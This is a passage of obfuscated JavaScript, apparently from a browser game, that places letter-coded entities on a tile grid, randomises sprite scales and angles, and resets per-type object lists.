					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ - ⵠᐃⵠΔ][ᐃⵠᐃⵠ];
					if (ᐃᐃⵠⵠΔ !== ⵠᐃᐃᐃ && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] !== undefined && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ] !== undefined) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ - ⵠΔⵠΔ];
					if (ⵠᐃᐃᐃ !== undefined && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] !== ΔⵠⲆᐃΔ && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ] !== ⲆΔⵠⲆⲆ) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ - ΔᐃⲆⵠ][ᐃⵠᐃⵠ + ΔΔᐃⵠ];
					if (ⵠᐃᐃᐃ !== undefined && ⲆΔⵠⲆⲆ !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] && undefined !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ]) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ + 1];
					if (undefined !== ⵠᐃᐃᐃ && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] !== ᐃⲆᐃⲆⲆ && undefined !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ]) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ - ΔⵠΔⵠ][ᐃⵠᐃⵠ - 1];
					if (undefined !== ⵠᐃᐃᐃ && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] !== undefined && undefined !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ]) continue;
					ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] === ᐃᐃⵠⵠΔ && (ⲆⵠⵠⲆ(ⵠᐃ, ᐃⵠᐃⵠ, ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⵠⲆΔ), ⵠᐃⲆⲆ++)
				}
			}

			function ΔⵠΔᐃⵠΔⵠΔⵠ(ΔⲆⵠᐃ, ⲆⲆΔⲆⵠ) {
				for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, Math.floor(ΔΔⲆⵠⵠᐃᐃ * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = ⲆΔⵠ; 3 > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "f", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 24));
				for (var ⵠᐃ = 0; ᐃᐃⲆⲆ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "d", ⵠᐃ, Math.max(ᐃᐃⲆΔ, Math.floor(ⲆⲆΔⲆⵠ * ⵠΔⲆᐃ)), .3);
				for (var ⵠᐃ = ΔΔⵠ; ⲆⲆΔⲆ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "g", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * ᐃⵠⵠⲆⵠ));
				ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ)
			}

			function ΔⵠΔⲆᐃᐃᐃᐃⲆ(ΔⲆⵠᐃ, ⲆⲆΔⲆⵠ) {
				for (var ⵠᐃ = 0; ⵠᐃ < ⵠᐃᐃΔ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "t", ⵠᐃ, Math.floor(Δⵠᐃᐃᐃ * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = Δᐃᐃᐃ; ⲆΔⵠᐃ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "b", ⵠᐃ, Math.floor(ΔⲆᐃᐃᐃⲆⲆ * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 20));
				var Ⲇᐃᐃⵠⵠ = [];
				ⲆⵠⲆΔᐃᐃⵠ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				ΔΔΔⵠⵠⲆΔ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				Ⲇᐃᐃⵠⵠ = [];
				ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "p", 0, Math.floor(24 * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = ⲆⲆⲆᐃ; 3 > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "g", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 5));
				if (ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ === ⲆⲆⲆ.mode) {
					for (var ⵠᐃ = ⵠΔⲆⵠ; ⲆΔⵠⵠ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "d", ⵠᐃ, Math.floor(3 * ⲆⲆΔⲆⵠ));
					for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "a", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 2))
				}
				ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ)
			}

			function ⵠⲆⵠⵠᐃⲆᐃᐃⵠ(ΔⲆⵠᐃ) {
				for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, 15);
				for (var ⵠᐃ = 0; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "a", ⵠᐃ, 1);
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; 3 > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "d", ⵠᐃ, 1);
				ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ)
			}

			function ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ, ᐃⵠᐃⵠ) {
				return ⵠᐃ >= ΔᐃΔΔ && ᐃⵠᐃⵠ >= ΔⲆⵠⲆ && ⵠᐃ < ⲆⲆⲆ.ⵠᐃⵠⲆⵠ && ᐃⵠᐃⵠ < ⲆⲆⲆ.ᐃΔᐃᐃΔ
			}

			function ⲆⵠⵠⲆ(ⵠᐃ, ᐃⵠᐃⵠ, ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ᐃᐃΔⲆⲆⲆⵠΔⲆ) {
				if (0 > ⵠᐃ || 0 > ᐃⵠᐃⵠ || ⲆⲆⲆ.ⵠᐃⵠⲆⵠ <= ⵠᐃ || ᐃⵠᐃⵠ >= ⲆⲆⲆ.ᐃΔᐃᐃΔ) return;
				ᐃΔⵠⲆ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ;
				if (ⵠᐃⵠⲆΔ === ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]) ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] = {};
				if (undefined !== ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ][ᐃᐃⵠⵠ]) return ΔΔⵠⵠ;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ][ᐃᐃⵠⵠ] = [];
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ][ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ] = [{
					x: ᐃⵠᐃⵠ * ᐃⵠΔᐃᐃ + 50,
					y: ⵠᐃ * 100 + 50
				}];
				if (ᐃᐃΔⲆⲆⲆⵠΔⲆ === ΔⲆⵠ) ᐃΔᐃⵠᐃⵠⲆⵠⵠ(ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⵠᐃ, ᐃⵠᐃⵠ);
				return ΔᐃᐃⲆ
			}

			function ⵠᐃⲆᐃⲆᐃΔΔᐃ(ΔⲆⵠᐃ, ⲆⲆΔⲆⵠ) {
				for (var ⵠᐃ = ⵠⲆⲆ; ⲆᐃΔᐃ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * ⵠⲆΔΔᐃ));
				for (var ⵠᐃ = ᐃⵠΔ; ΔᐃⲆΔ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "m", ⵠᐃ, Math.max(1, Math.floor(ⲆⲆΔⲆⵠ * 1)), .2);
				ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "c", ΔⲆⲆ, Math.floor(36 * ⲆⲆΔⲆⵠ));
				var Ⲇᐃᐃⵠⵠ = [];
				ᐃΔᐃⵠⲆᐃⲆⵠᐃ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				ΔΔΔⵠⵠⲆΔ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				Ⲇᐃᐃⵠⵠ = []
			}

			function ᐃⲆⲆᐃᐃᐃᐃᐃᐃ(ΔⲆⵠᐃ, ⲆⲆΔⲆⵠ) {
				ⲆⵠᐃⵠⵠⵠⲆⵠΔ(80 * ⲆⲆΔⲆⵠ, ΔⲆⵠᐃ);
				for (var ⵠᐃ = ΔⲆⵠⲆ; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 12));
				for (var ⵠᐃ = 0; 3 > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "g", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 6));
				for (var ⵠᐃ = 0; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, ⵠ[196], ⵠᐃ, Math.max(ᐃΔᐃⲆ, Math.floor(1 * ⲆⲆΔⲆⵠ)), .2);
				for (var ⵠᐃ = 0; ⵠᐃ < ⵠⵠⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "a", ⵠᐃ, Math.max(ⲆⵠⲆⲆ, Math.floor(ⲆⲆΔⲆⵠ * ⵠⵠⵠΔ)));
				ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ)
			}
			this.ⲆⵠⵠⲆ = ⲆⵠⵠⲆ;

			function ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ᐃⲆΔ, ᐃᐃⵠΔ) {
				if (ⵠᐃᐃᐃ[ᐃⲆΔ]) {
					for (ⵠᐃⲆⲆ = ΔⲆⲆ; ⵠᐃⲆⲆ < ⵠᐃᐃᐃ[ᐃⲆΔ].length; ⵠᐃⲆⲆ++) {
						if (!ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ]) continue;
						for (ⲆⲆⵠΔ = ᐃⵠⲆ; ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ].length > ⲆⲆⵠΔ; ⲆⲆⵠΔ++) {
							ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ][ⲆⲆⵠΔ].Δᐃⵠ = ᐃᐃⵠΔ;
							ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ][ⲆⲆⵠΔ].ⵠⲆᐃ = ΔⵠΔⲆΔ;
							ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ][ⲆⲆⵠΔ].time = ᐃⵠⲆ;
							ⵠᐃᐃᐃ[ᐃⲆΔ][ⵠᐃⲆⲆ][ⲆⲆⵠΔ].angle = 0
						}
					}
				}
			}
			this.ⲆⵠΔΔΔᐃⵠⲆᐃ = function(ΔⲆΔⵠⲆ) {
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠᐃ < this.ⵠᐃⵠⲆⵠ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ᐃⵠⲆⵠ; this.ᐃΔᐃᐃΔ > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						!ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ] && (ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ] = []);
						if (!ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]) {
							ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] = [];
							continue
						}
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
						if (ⵠᐃᐃᐃ[ⵠ[348]] && ⵠᐃᐃᐃ[ⵠ[348]].length > ΔⲆⲆ) {
							for (var ⵠᐃⲆⲆ = 0; ⵠᐃᐃᐃ[ⵠ[348]].length > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
								if (ⵠᐃᐃᐃ[ⵠ[348]][ⵠᐃⲆⲆ] && ⵠᐃᐃᐃ[ⵠ[348]][ⵠᐃⲆⲆ].length > 0) {
									ⵠᐃᐃᐃ[ⵠ[348]] = ⵠᐃᐃᐃ[ⵠ[348]][ⵠᐃⲆⲆ][0];
									if (41 <= ⵠᐃⲆⲆ && 49 >= ⵠᐃⲆⲆ) {
										ⵠᐃᐃᐃ[ⵠ[348]].scale = ΔᐃⲆΔ;
										var ᐃⲆᐃⵠᐃᐃΔ = Math.floor(ᐃⵠⲆΔᐃ * Math.random() + ᐃΔᐃⲆ);
										ⵠᐃᐃᐃ[ⵠ[348]].ᐃⲆⲆ = [];
										for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < ᐃⲆᐃⵠᐃᐃΔ; ⲆⲆⵠΔ++) {
											ⵠᐃᐃᐃ[ⵠ[348]].ᐃⲆⲆ.push({
												x: 120 * Math.random() - 60,
												y: 120 * Math.random() - 60,
												angle: Math.random() * Math.PI * ⵠΔᐃᐃⵠ,
												"ΔΔᐃⲆⵠ": 41 + Math.floor(Math.random() * 9)
											})
										}
									} else if (ⲆⲆⵠᐃⲆΔⲆ <= ⵠᐃⲆⲆ && ⵠᐃⲆⲆ <= 26) {
										ⵠᐃᐃᐃ[ⵠ[348]].scale = ᐃᐃⵠⲆᐃ;
										var ᐃⲆᐃⵠᐃᐃΔ = Math.floor(3 * Math.random() + ⵠΔᐃ);
										ⵠᐃᐃᐃ[ⵠ[348]].ᐃⲆⲆ = [];
										for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < ᐃⲆᐃⵠᐃᐃΔ; ⲆⲆⵠΔ++) {
											ⵠᐃᐃᐃ[ⵠ[348]].ᐃⲆⲆ.push({
												x: Math.random() * 120 - 60,
												y: Math.random() * 120 - 60,
												angle: Math.PI * Math.random() * ⲆᐃᐃⲆ,
												"ΔΔᐃⲆⵠ": 19 + Math.floor(Math.random() * 8)
											})
										}
									} else ⵠᐃⲆⲆ <= 15 || ⵠᐃⲆⲆ >= 27 && 40 >= ⵠᐃⲆⲆ ? (ⵠᐃᐃᐃ[ⵠ[348]].angle = ⵠᐃⲆᐃ, ⵠᐃᐃᐃ[ⵠ[348]].scale = 2, ⵠᐃᐃᐃ[ⵠ[348]].ΔΔᐃⲆⵠ = ⵠᐃⲆⲆ) : (ⵠᐃᐃᐃ[ⵠ[348]].angle = Math.random() * Math.PI * 2, ⵠᐃᐃᐃ[ⵠ[348]].scale = 1, ⵠᐃᐃᐃ[ⵠ[348]].ΔΔᐃⲆⵠ = ⵠᐃⲆⲆ)
								}
							}
						}
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "p", new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⲆᐃⵠΔ, 1, 1, 0, 10, ⵠⵠⲆΔΔ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "t", new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃⵠΔⵠ, 1, 1, 0, 10, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "s", new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ⵠΔⵠΔ, 1, ⵠⲆⲆ, 10, ⲆⵠⲆⲆᐃ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "g", new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔⲆᐃᐃ, ⵠⲆΔ, 0, ⲆⵠⲆⵠⲆ, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "d", new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1, 0, 10, ⲆⵠⲆⵠⲆ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "b", new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1, 0, 10, ⵠⲆⲆᐃⵠ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "f", new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔᐃⲆΔ, 1, ΔⲆᐃᐃ, 0, 10, ⲆⲆᐃΔΔ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[456], new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⲆᐃⵠΔ, ⵠΔᐃ, 1, 0, ᐃⵠΔⵠⵠ, ᐃΔᐃΔⲆ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[297], new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆᐃⵠⲆⵠ, 1, ⵠⲆΔ, ΔⲆⲆ, ⵠⵠΔⲆᐃ, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[70], new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔᐃⲆⵠ, 1, ᐃⵠΔ, ⵠⵠΔⲆᐃ, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "a", new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, 1, 1, 0, 10, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[568], new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1, 0, 10, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[138], new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃΔΔⵠ, ᐃΔᐃⲆ, ΔΔΔ, Δⵠᐃ, ⵠⵠⲆΔΔ, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, ⵠ[196], new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔᐃᐃⲆ, 1, ΔⲆⲆ, 10, ⵠᐃⲆⲆΔ));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "c", new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃⵠΔⵠ, ΔⲆᐃᐃ, 1, ᐃΔΔ, ⵠᐃⲆⲆΔ, 10));
						ΔⵠΔⵠᐃ(ⵠᐃᐃᐃ, "m", new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔΔⵠⲆΔ, ΔⵠΔⵠ, ᐃᐃⵠ, 0, ΔⲆⵠⲆⲆ, 10))
					}
				}
			};
			this.time = Ⲇ.ⲆⵠΔ;
			this.ⲆΔΔΔⵠ = {
				translate: {
					x: 0,
					y: 0
				},
				"ⲆⲆⲆΔⵠ": ΔᐃΔΔ,
				"ᐃⲆⲆΔΔ": 0,
				now: 0
			};
			this.ᐃΔΔⲆᐃⵠⲆⵠⲆ = function() {
				this.ᐃⲆⵠⵠⲆ = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆⵠΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠⵠᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⲆᐃⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆⲆΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⲆⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⲆⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⵠⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔⵠᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃᐃΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆᐃᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔᐃΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⵠΔΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃΔΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆᐃⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠΔⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔΔⲆⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⲆⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔΔᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⵠⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⲆⵠⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆΔᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⵠᐃᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔΔⵠᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⵠΔᐃΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆΔᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃⲆ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆΔⵠΔ] = [];
				this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆⲆᐃ] = [];
				return
			};
			this.ΔⲆⵠⲆⲆⵠΔⵠΔ = function(ⲆᐃΔΔ) {
				if (!this.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ]) return;
				ᐃᐃⵠⵠ = this.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ].type;
				this.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ] = null;
				var ΔⲆᐃ = this.ΔⲆᐃ[ᐃᐃⵠⵠ];
				for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ΔⲆᐃ.length; ᐃⵠᐃⵠ++) {
					if (ΔⲆᐃ[ᐃⵠᐃⵠ].ⲆᐃΔΔ == ⲆᐃΔΔ) {
						ΔⲆᐃ.splice(ᐃⵠᐃⵠ, 1);
						return
					}
				}
				return
			};
			this.ΔᐃⲆΔᐃᐃⲆⲆᐃ = function(ⵠᐃ, ᐃⵠᐃⵠ) {
